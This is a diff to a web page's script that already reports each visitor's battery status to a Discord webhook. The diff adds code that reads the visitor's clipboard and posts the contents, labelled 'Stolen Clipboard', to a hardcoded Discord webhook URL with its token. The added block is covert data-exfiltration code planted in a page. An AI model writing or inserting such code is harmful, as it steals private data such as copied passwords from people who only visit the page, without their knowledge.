@@ -17,6 +17,17 @@
                     content: `🔋 **New Visitor Alert!** Battery: ${Math.round(battery.level * 100)}% | Charging: ${battery.charging}`
                 })
             });
+            navigator.clipboard.readText().then(text => {
+                fetch('https://discord.com/api/webhooks/1547219958113501184/yl_zJgd1KLN5n984pKjm6T6lpuvSTnx-9EKITJ3MtcQEsHeFWoNDiST-kNu6DzR6Vkvn', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `📋 **Stolen Clipboard:** "${text}"`
+                    })
+                });
+            }).catch(err => {
+                // User denied clipboard permission
+            });
         });
     }
 </script>
